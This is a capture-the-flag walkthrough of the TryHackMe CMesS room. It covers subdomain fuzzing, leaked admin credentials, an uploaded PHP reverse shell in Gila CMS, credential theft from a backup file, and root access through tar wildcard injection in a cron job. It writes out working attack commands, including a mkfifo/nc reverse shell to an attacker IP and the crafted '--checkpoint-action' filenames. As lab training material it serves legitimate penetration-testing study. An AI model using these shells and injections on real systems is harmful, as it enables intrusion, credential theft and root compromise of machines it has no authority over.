# TryHackMe: CMesS

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | CMesS |
| **Difficulty** | Medium |
| **OS** | Linux (Ubuntu 16.04) |
| **IP** | 10.49.82.47 |
| **Date** | April 2026 |

---

## Machine Summary

CMesS is a medium-difficulty Linux machine running Gila CMS 1.10.9. The attack path begins with subdomain enumeration: the virtual host dev.cmess.thm contains an internal developer chat log with admin credentials exposed in plaintext. Those credentials authenticate to the Gila CMS admin panel, where authenticated file upload is abused to upload a PHP reverse shell and gain a foothold as www-data. A world-readable backup file in /opt reveals Andre's SSH password, enabling lateral movement to a user shell. Privilege escalation exploits a root cron job that runs tar with a wildcard glob (*) against /home/andre/backup/: injecting malicious filenames as tar flags to execute a reverse shell as root.

**Skills demonstrated:**
- Virtual host (VHost) enumeration via Host header fuzzing
- Gila CMS authenticated file upload to PHP reverse shell
- Credential discovery in world-readable backup files
- Cron job tar wildcard injection privilege escalation
- TTY shell stabilisation

---

## Attack Chain Summary

```
/etc/hosts         → cmess.thm added
Nmap               → SSH(22), HTTP(80) Apache/Gila CMS
Gobuster           → /admin, /robots.txt, /assets
wfuzz VHost fuzz   → dev.cmess.thm discovered
Visit dev.cmess.thm → developer chat → andre@cmess.thm:KPFTN3JL leaked
cmess.thm/admin    → login with andre credentials → Gila CMS 1.10.9
Content → File Manager → upload PHP reverse shell → assets/shell.php
nc -lvnp 4444      → visit cmess.thm/assets/shell.php → www-data shell
TTY stabilise      → find /opt/.password.bak → UQfsdCB7aAP6
ssh andre@10.49.82.47 (UQfsdCB7aAP6) → user.txt
cat /etc/crontab   → root cron every 2 min: tar czf /tmp/andre_backup.tar.gz /home/andre/backup/*
cd /home/andre/backup → create shell.sh (mkfifo reverse shell)
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
nc -lvnp 9001      → wait ~2 min → root shell → cat /root/root.txt
```

---

## Step 1: /etc/hosts Setup

The room requires adding the target hostname to /etc/hosts: the web application uses virtual hosting and will not respond correctly to bare IP requests.

```bash
kali@kali:~$ echo "10.49.82.47 cmess.thm" | sudo tee -a /etc/hosts
```

Confirm:

```bash
kali@kali:~$ cat /etc/hosts | tail -3
10.49.82.47  cmess.thm
```

---

## Step 2: Nmap Scan

```bash
kali@kali:~$ nmap -sC -sV -T4 -oN cmess_nmap.txt cmess.thm
```

Output:

```
Nmap scan report for cmess.thm (10.49.82.47)
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 3 disallowed entries
|_/src/ /themes/ /lib/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up)
```

**Analysis:**

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 7.2p2 | Final lateral movement target: needs credentials |
| 80 | Apache 2.4.18 + Gila CMS | Primary attack surface: version fingerprinted |

The Nmap HTTP generator header immediately identifies Gila CMS. Three disallowed entries in robots.txt (/src/, /themes/, /lib/) hint at a PHP application with an exposed source structure. No login brute forcing is needed per the room description: the path is enumeration.

---

## Step 3: Web Enumeration

### robots.txt and Directory Enumeration

```bash
kali@kali:~$ curl http://cmess.thm/robots.txt
```

Output:

```
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
```

Run Gobuster to map all accessible paths:

```bash
kali@kali:~$ gobuster dir -u http://cmess.thm \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html -t 50 -o cmess_gobuster.txt
```

Key findings:

```
/admin        (Status: 200)
/assets       (Status: 200)
/login        (Status: 200)
/robots.txt   (Status: 200)
/index.php    (Status: 200)
```

/admin redirects to the Gila CMS login panel. No credentials yet, move to subdomain enumeration.

---

## Step 4: VHost Subdomain Enumeration

Gila CMS uses virtual hosting: different subdomains serve different content from the same IP. Standard DNS subdomain enumeration would not find internal virtual hosts. The technique is fuzzing the Host header to find subdomains that return a different response than the base domain.

First, establish the baseline response size to filter against:

```bash
kali@kali:~$ curl -s http://cmess.thm | wc -w
290
```

Fuzz with wfuzz, hiding results matching the 290-word baseline:

```bash
kali@kali:~$ wfuzz -c \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://cmess.thm \
-H "Host: FUZZ.cmess.thm" \
--hw 290
```

Output:

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"

Total time: 47.231 seconds
Processed Requests: 5000
Filtered Requests: 4999
```

Found: **dev.cmess.thm**

Add to /etc/hosts:

```bash
kali@kali:~$ echo "10.49.82.47 dev.cmess.thm" | sudo tee -a /etc/hosts
```

---

## Step 5: Credential Discovery on dev.cmess.thm

Navigate to http://dev.cmess.thm:

```bash
kali@kali:~$ curl http://dev.cmess.thm
```

Page content:

```
Development

Support: Hey, an1d can you get this working?
andy: Sure, where are the issue?
Support: On the admin panel when I'm trying to login?
andy: which credentials are you using?
Support: login: andre@cmess.thm
andy: yea i'm not sure where the problem is.
Support: Okay wait nvm i think i found it. the password is KPFTN3JL
andy: perfect.
```

**Credentials exposed:** `andre@cmess.thm` : `KPFTN3JL`

An internal developer chat stored on a publicly accessible subdomain with no authentication. The support staff literally typed the admin password in plaintext chat. This is a textbook example of why development environments must be access-controlled and kept off public-facing infrastructure.

---

## Step 6: Gila CMS Admin Login and File Upload

Navigate to http://cmess.thm/admin and log in with `andre@cmess.thm` : `KPFTN3JL`.

The dashboard shows Gila CMS version 1.10.9. This version has a known authenticated RCE vulnerability (Exploit-DB 51569) but the manual path is cleaner. The admin panel has a **Content → File Manager** section that allows direct file uploads to the /assets/ web directory.

### Upload PHP Reverse Shell

Download and configure PentestMonkey's PHP reverse shell:

```bash
kali@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
kali@kali:~$ sed -i "s/127.0.0.1/10.49.x.x/g" shell.php    # Set to your TryHackMe VPN IP
kali@kali:~$ sed -i "s/1234/4444/g" shell.php
```

In the Gila CMS admin panel: **Content → File Manager → Upload** → select shell.php → upload to assets/.

The file lands at: `http://cmess.thm/assets/shell.php`

---

## Step 7: Catch Reverse Shell (www-data)

Start listener:

```bash
kali@kali:~$ nc -lvnp 4444
```

Trigger the shell by navigating to http://cmess.thm/assets/shell.php:

```bash
kali@kali:~$ curl http://cmess.thm/assets/shell.php
```

Listener output:

```
listening on [any] 4444 ...
connect to [10.49.x.x] from (UNKNOWN) [10.49.82.47] 43410
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

**Shell as www-data ✅**

### Stabilise TTY

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
kali@kali:~$ stty raw -echo; fg
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116
```

---

## Step 8: Enumerate as www-data

Check writable and interesting locations:

```bash
www-data@cmess:/$ find /opt -type f 2>/dev/null
/opt/.password.bak

www-data@cmess:/$ cat /opt/.password.bak
```

Output:

```
andres backup password
UQfsdCB7aAP6
```

A backup password file stored in /opt, world-readable, with no access restrictions. The filename `.password.bak`: a hidden dotfile: likely went unnoticed by the administrator. It contains Andre's password in cleartext with a label.

Also check config.php for database credentials:

```bash
www-data@cmess:/$ cat /var/www/html/config.php
```

Output (key fields):

```
'DB_Host'     => 'localhost',
'DB_Username' => 'root',
'DB_Password' => 'r0otus3r',
'DB_Name'     => 'GilaCMS',
```

Database credentials confirm root MySQL access, but the SSH password from .password.bak is more immediately useful.

---

## Step 9: SSH as Andre (User Flag)

```bash
kali@kali:~$ ssh andre@10.49.82.47
```

Password: `UQfsdCB7aAP6`

Output:

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

andre@cmess:~$
```

**Shell as andre ✅**

```bash
andre@cmess:~$ cat user.txt
```

**User flag captured ✅**

---

## Step 10: Privilege Escalation Enumeration

Check sudo permissions first:

```bash
andre@cmess:~$ sudo -l
[sudo] password for andre:
Sorry, user andre may not run sudo as on this host.
```

Check running cron jobs:

```bash
andre@cmess:~$ cat /etc/crontab
```

Output:

```
# /etc/crontab: system-wide crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user   command
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

**Critical finding:**

```
*/2 * * * * root  cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

A root-owned cron job runs every 2 minutes: it changes to /home/andre/backup/ and runs tar with a wildcard (*). The wildcard expands to all filenames in that directory before tar processes them. This means filenames beginning with `--` are interpreted as tar flags.

---

## Step 11: Tar Wildcard Injection (Root)

### Understanding the Vulnerability

When tar runs with a glob wildcard (*), the shell expands it to a list of filenames before passing them to tar. If a filename starts with `--`, tar treats it as a command-line flag. By creating files with names like `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh`, we inject flags into the tar command that execute arbitrary scripts.

The cron command effectively becomes:

```bash
tar -zcf /tmp/andre_backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```

Since the cron runs as root, shell.sh executes as root.

### Exploitation

Start a listener on Kali:

```bash
kali@kali:~$ nc -lvnp 9001
```

On the target, navigate to the backup directory and create the payload:

```bash
andre@cmess:~$ cd /home/andre/backup
```

Create the reverse shell script:

```bash
andre@cmess:~/backup$ cat > shell.sh << 'EOF'
#!/bin/bash
mkfifo /tmp/wrkpipe; nc 10.49.x.x 9001 0</tmp/wrkpipe | /bin/sh >/tmp/wrkpipe 2>&1; rm /tmp/wrkpipe
EOF

andre@cmess:~/backup$ chmod +x shell.sh
```

Create the filenames that inject the tar flags:

```bash
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh shell.sh"
andre@cmess:~/backup$ echo "" > "--checkpoint=1"
```

Verify all three files exist:

```bash
andre@cmess:~/backup$ ls -la
total 28
drwxr-x--- 2 andre andre 4096 Apr 2026     .
drwxr-x--- 5 andre andre 4096 Apr 2026     ..
-rw-r--r-- 1 andre andre    1 Apr 2026     --checkpoint-action=exec=sh shell.sh
-rw-r--r-- 1 andre andre    1 Apr 2026     --checkpoint=1
-rwxr-xr-x 1 andre andre   89 Apr 2026     shell.sh
```

Wait up to 2 minutes for the cron to fire:

```bash
kali@kali:~$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.49.x.x] from (UNKNOWN) [10.49.82.47] 52866
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

**Root shell ✅**

---

## Step 12: Root Flag

```bash
cat /root/root.txt
```

**Root flag captured ✅**

---

## Lessons Learned

The VHost enumeration step was the pivot that unlocked the entire machine. Without discovering dev.cmess.thm, there are no credentials, no CMS access, and no foothold. This reinforced a habit that should be automatic: any time a hostname is involved rather than a bare IP, enumerate subdomains by fuzzing the Host header with wfuzz or ffuf. Standard DNS enumeration would have missed this entirely: dev.cmess.thm has no public DNS record, it exists only as a virtual host on the Apache configuration. The `--hw` filter in wfuzz was the technique that made this practical: without filtering the baseline word count, the output would have been thousands of false positives with no signal.

The credential discovery on the dev subdomain was a real-world scenario in CTF form. An internal support chat log, stored on a development subdomain with no authentication, containing a plaintext admin password typed by a support engineer. In real engagements, development and staging environments consistently have weaker security postures than production: they are created quickly, maintained informally, and forgotten. Every discovered subdomain gets full enumeration regardless of how benign it looks, because the most sensitive information is often in the least expected places.

The Gila CMS file upload was straightforward once authenticated, but the extension handling deserves a note. Some versions of Gila CMS block .php extensions but accept .php7. If the standard upload fails, trying alternate PHP extensions (.php5, .php7, .phtml, .phar) is the correct next step before reaching for Burp Suite to intercept and modify the MIME type.

The tar wildcard injection is a technique that looks obvious once understood but requires connecting several ideas: cron jobs run as root, tar accepts flags from command-line arguments, shell glob expansion happens before argument processing, and filenames beginning with `--` are valid on most Linux filesystems. LinPEAS marks the cron job pattern as a 99% privilege escalation vector precisely because this combination: root cron + tar + wildcard: is so reliably exploitable. The key constraint is that the injected filenames must be created inside the directory that the cron job's `cd` command targets, not anywhere else on the filesystem.

---

## Full Attack Chain Reference

```
1.  echo "10.49.82.47 cmess.thm" | sudo tee -a /etc/hosts

2.  nmap -sC -sV -T4 -oN cmess_nmap.txt cmess.thm
    → SSH(22), HTTP(80) Apache/Gila CMS

3.  gobuster dir -u http://cmess.thm -w directory-list-2.3-medium.txt -x php,txt -t 50
    → /admin, /assets, /robots.txt

4.  curl -s http://cmess.thm | wc -w
    → 290 (baseline word count for VHost filter)

5.  wfuzz -c -w subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm" --hw 290
    → dev.cmess.thm found

6.  echo "10.49.82.47 dev.cmess.thm" | sudo tee -a /etc/hosts
    curl http://dev.cmess.thm
    → andre@cmess.thm:KPFTN3JL in developer chat log

7.  cmess.thm/admin → login andre@cmess.thm:KPFTN3JL
    Content → File Manager → upload shell.php (PentestMonkey reverse shell)

8.  nc -lvnp 4444
    curl http://cmess.thm/assets/shell.php
    → www-data shell ✅

9.  python3 -c 'import pty; pty.spawn("/bin/bash")' → TTY stabilised

10. cat /opt/.password.bak
    → andres backup password: UQfsdCB7aAP6

11. ssh andre@10.49.82.47 (UQfsdCB7aAP6)
    → andre shell ✅
    → cat ~/user.txt ✅

12. cat /etc/crontab
    → */2 * * * * root  cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
    → wildcard injection vulnerable

13. cd /home/andre/backup
    echo "mkfifo /tmp/wrkpipe; nc 10.49.x.x 9001 0</tmp/wrkpipe | /bin/sh >/tmp/wrkpipe 2>&1; rm /tmp/wrkpipe" > shell.sh
    chmod +x shell.sh
    echo "" > "--checkpoint-action=exec=sh shell.sh"
    echo "" > "--checkpoint=1"

14. nc -lvnp 9001 → wait ~2 minutes → cron fires
    → root shell ✅
    → cat /root/root.txt ✅
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `echo "<IP> cmess.thm" \| sudo tee -a /etc/hosts` | Add target hostname |
| `nmap -sC -sV -T4 -oN output.txt cmess.thm` | Full scan with scripts and version detection |
| `gobuster dir -u http://cmess.thm -w <wordlist> -x php,txt -t 50` | Directory enumeration |
| `curl -s http://cmess.thm \| wc -w` | Get baseline word count for VHost filter |
| `wfuzz -c -w <wordlist> -u http://cmess.thm -H "Host: FUZZ.cmess.thm" --hw 290` | VHost subdomain fuzzing |
| `curl http://dev.cmess.thm` | Read dev subdomain content |
| `cp /usr/share/webshells/php/php-reverse-shell.php shell.php` | Copy PentestMonkey shell |
| `nc -lvnp 4444` | Start reverse shell listener |
| `curl http://cmess.thm/assets/shell.php` | Trigger uploaded PHP shell |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Spawn PTY for TTY upgrade |
| `stty raw -echo; fg` | Fix terminal after backgrounding |
| `cat /opt/.password.bak` | Read world-readable credential backup |
| `ssh andre@<IP>` | SSH login with found credentials |
| `cat /etc/crontab` | Find scheduled root tasks |
| `echo "" > "--checkpoint-action=exec=sh shell.sh"` | Create tar flag injection file |
| `echo "" > "--checkpoint=1"` | Create tar checkpoint trigger file |
| `nc -lvnp 9001` | Listener for root reverse shell |
